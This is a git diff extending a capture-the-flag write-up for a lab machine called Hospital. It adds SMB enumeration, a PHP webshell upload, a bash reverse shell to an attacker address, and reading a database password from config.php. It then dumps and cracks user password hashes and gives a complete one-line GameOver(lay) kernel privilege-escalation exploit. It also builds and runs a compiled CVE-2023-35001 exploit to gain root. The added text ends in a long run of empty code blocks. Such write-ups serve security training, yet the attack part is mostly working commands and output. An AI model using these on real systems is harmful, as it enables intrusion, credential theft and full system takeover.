@@ -168,6 +168,11 @@ SMB         10.10.11.241    445    DC               [*] Windows 10 / Server 2019
 SMB         10.10.11.241    445    DC               [-] hospital.htb\: STATUS_ACCESS_DENIED
 ```
 
+```bash
+$ smbclient -N -L //$TARGET
+session setup failed: NT_STATUS_ACCESS_DENIED
+```
+
 Not much here yet.
 
 Lets try one on the `HTTPS port`.
@@ -300,9 +305,11 @@ To investigate this, we upload another code invoking `phpinfo` and see that `pcn
 
 ![Port 8080 - phpinfo - disabled fuc](images/port_8080_phpinfo_disabled_func.png)
 
-[HackTricks - PHP Useful Functions](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass) pint out to a few scripts we could use to bypass the restrictions we have here. The [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php webshell one can automatically check and bypass the following function if some of them be disabled.
+[HackTricks - PHP Useful Functions](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass) point out to a few scripts we could use to bypass the restrictions we have here. The [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php webshell one can automatically check and bypass the following function if some of them be disabled.
 
-We create a file with it and upload to the target. As we access it, we get shell.
+We create a file with it and upload to the target using the site upload built in tool. As we access it, we get shell.
+
+> http://10.10.11.241:8080/uploads/shell.phar
 
 ![Port 8080 - webshell](images/port_8080_webshell.png)
 
@@ -331,6 +338,383 @@ BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
 PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
 UBUNTU_CODENAME=lunar
 LOGO=ubuntu-logo
+```
+
+```bash
+www-data@webserver:…/html/uploads# ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:15:5d:00:8a:02 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.5.2/24 brd 192.168.5.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::215:5dff:fe00:8a02/64 scope link 
+       valid_lft forever preferred_lft forever
+```
+
+```bash
+www-data@webserver:…/html/uploads# grep "sh$" /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
+```
+
+```bash
+www-data@webserver:…/html/uploads# ls -lha /home/drwilliams
+ls: cannot open directory '/home/drwilliams': Permission denied
+```
+
+At this point I lost connection and I noted that the shell file was not present any more on the target. I believe the machine has a process to remove the bad files or something like that.
+
+I uploaded again the webshell and started a reverse shell to don't get kicked out again.
+
+```bash
+$ rlwrap -cAr nc -nlvp 9001
+listening on [any] 9001 ...
+```
+
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.14.8/9001 0>&1'
+```
+
+```bash
+$ rlwrap -cAr nc -nlvp 9001
+listening on [any] 9001 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.11.241] 6578
+bash: cannot set terminal process group (979): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@webserver:/var/www/html/uploads$ 
+```
+
+```bash
+www-data@webserver:/var/www/html/uploads$ ls ../
+ls ../
+config.php  fonts      js          register.php  uploads
+css         images     login.php   success.php   vendor
+failed.php  index.php  logout.php  upload.php
+```
+
+```bash
+www-data@webserver:/var/www/html/uploads$ cat ../config.php
+cat ../config.php
+<?php
+/* Database credentials. Assuming you are running MySQL
+server with default setting (user 'root' with no password) */
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'root');
+define('DB_PASSWORD', 'my$qls3rv1c3!');
+define('DB_NAME', 'hospital');
+ 
+/* Attempt to connect to MySQL database */
+$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
+ 
+// Check connection
+if($link === false){
+    die("ERROR: Could not connect. " . mysqli_connect_error());
+}
+?>
+```
+
+```bash
+www-data@webserver:/var/www/html/uploads$ mmysql -u root -p'my$qls3rv1c3!'
+mysql -u root -p'my$qls3rv1c3!'
+...
+Server version: 10.11.2-MariaDB-1 Ubuntu 23.04
+...
+MariaDB [(none)]> 
+```
+
+```bash
+MariaDB [(none)]> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| hospital           |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.016 sec)
+```
+
+```bash
+MariaDB [(none)]> use hospital;
+use hospital;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+```
+
+```bash
+MariaDB [hospital]> show tables;
+show tables;
++--------------------+
+| Tables_in_hospital |
++--------------------+
+| users              |
++--------------------+
+1 row in set (0.000 sec)
+```
+
+```bash
+MariaDB [hospital]> select * from users;
+select * from users;
++----+----------+--------------------------------------------------------------+---------------------+
+| id | username | password                                                     | created_at          |
++----+----------+--------------------------------------------------------------+---------------------+
+|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
+|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
+|  3 | kali     | $2y$10$UINIXmeTUZmfmBkYh2kpdu5gLYj7qRAsfZyRuFMb07PaOH1ejq8ye | 2024-08-20 12:24:59 |
++----+----------+--------------------------------------------------------------+---------------------+
+3 rows in set (0.001 sec)
+```
+
+```bash
+$ cat admin.hash    
+$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2
+```
+
+```bash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt admin.hash          
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+123456           (?)     
+1g 0:00:00:00 DONE (2024-08-20 04:38) 2.127g/s 153.1p/s 153.1c/s 153.1C/s 123456..666666
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+```bash
+$ cat patient.hash 
+$2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO
+```
+
+```bash
+$ john --wordlist=/usr/share/wordlists/rockyou.txt patient.hash                     
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+patient          (?)     
+1g 0:00:05:51 DONE (2024-08-20 04:47) 0.002845g/s 152.0p/s 152.0c/s 152.0C/s redbutterfly..paolos
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+I tried these password in different places, but didn't find much.
+
+## GameOver(lay) - CVE-2023-2640 and CVE-2023-32629
+
+### PoC
+
+```bash
+unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; id")'
+```
+
+```bash
+www-data@webserver:/var/www/html/uploads$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; id")'
+
+uid=0(root) gid=33(www-data) groups=33(www-data)
+```
+
+If we change `id` at the end to `bash` we get our `root` shell.
+
+```bash
+www-data@webserver:/var/www/html/uploads$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; bash")'
+
+root@webserver:/var/www/html/uploads#
+```
+
+```bash
+root@webserver:/var/www/html/uploads# id
+
+uid=0(root) gid=33(www-data) groups=33(www-data)
+```
+
+## [CVE-2023-35001](https://github.com/rafamarrara/CTFs/tree/main/Labs/CVE-2023-35001)
+
+### PoC
+
+I cloned this [PoC exploit](https://github.com/synacktiv/CVE-2023-35001)
+
+```bash
+$ git clone https://github.com/synacktiv/CVE-2023-35001    
+Cloning into 'CVE-2023-35001'...
+remote: Enumerating objects: 9, done.
+remote: Counting objects: 100% (9/9), done.
+remote: Compressing objects: 100% (8/8), done.
+remote: Total 9 (delta 0), reused 9 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (9/9), 13.02 KiB | 833.00 KiB/s, done.
+```
+
+```bash
+$ cd CVE-2023-35001
+```
+
+```bash
+$ ls
+go.mod  go.sum  main.go  Makefile  README.md  src
+```
+
+Compiled it.
+
+```bash
+$ make
+go build
+go: downloading golang.org/x/sys v0.0.0-20211205182925-97ca703d548d
+go: downloading github.com/google/nftables v0.0.0-20220611213346-a346d51f53b3
+go: downloading github.com/vishvananda/netns v0.0.0-20180720170159-13995c7128cc
+go: downloading github.com/mdlayher/netlink v1.4.2
+go: downloading github.com/josharian/native v0.0.0-20200817173448-b6b71def0850
+go: downloading github.com/mdlayher/socket v0.0.0-20211102153432-57e3fa563ecb
+go: downloading golang.org/x/net v0.0.0-20211209124913-491a49abca63
+gcc -Wall -Wextra -Werror -std=c99 -Os -g0 -D_GNU_SOURCE -D_DEFAULT_SOURCE -D_POSIX_C_SOURCE=200809L src/wrapper.c -o wrapper
+zip lpe.zip exploit wrapper
+  adding: exploit (deflated 42%)
+  adding: wrapper (deflated 83%)
+```
+
+Transfered the files `exploit` and `wrapper` to the target.
+
+```bash
+$ python3 -m http.server 8181
+Serving HTTP on 0.0.0.0 port 8181 (http://0.0.0.0:8181/) ...
+```
+
+```bash
+root@webserver:/tmp$ wget 10.10.14.8:8181/exploit
+--2024-08-22 10:02:25--  http://10.10.14.8:8181/exploit
+Connecting to 10.10.14.8:8181... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3137336 (3.0M) [application/octet-stream]
+Saving to: ‘exploit’
+exploit             100%[===================>]   2.99M  1.13MB/s    in 2.6s    
+2024-08-22 10:02:28 (1.13 MB/s) - ‘exploit’ saved [3137336/3137336]
+```
+
+```bash
+root@webserver:/tmp$ wget 10.10.14.8:8181/wrapper
+--2024-08-22 10:02:37--  http://10.10.14.8:8181/wrapper
+Connecting to 10.10.14.8:8181... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16304 (16K) [application/octet-stream]
+Saving to: ‘wrapper’
+wrapper             100%[===================>]  15.92K  --.-KB/s    in 0.09s   
+2024-08-22 10:02:38 (175 KB/s) - ‘wrapper’ saved [16304/16304]
+```
+
+```bash
+$ python3 -m http.server 8181
+Serving HTTP on 0.0.0.0 port 8181 (http://0.0.0.0:8181/) ...
+10.10.11.241 - - [20/Aug/2024 05:04:29] "GET /exploit HTTP/1.1" 200 -
+10.10.11.241 - - [20/Aug/2024 05:04:41] "GET /wrapper HTTP/1.1" 200 -
+```
+
+Changed its permissions and executed the `exploit`.
+
+```bash
+www-data@webserver:/tmp$ chmod +x exploit wrapper
+
+www-data@webserver:/tmp$ ./exploit
+./exploit
+[+] Using config: 5.19.0-35-generic
+[+] Recovering module base
+[+] Module base: 0xffffffffc0592000
+[+] Recovering kernel base
+[+] Kernel base: 0xffffffffb0600000
+[+] Got root !!!
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
+```
+
+```bash
 ```
 
 ```bash
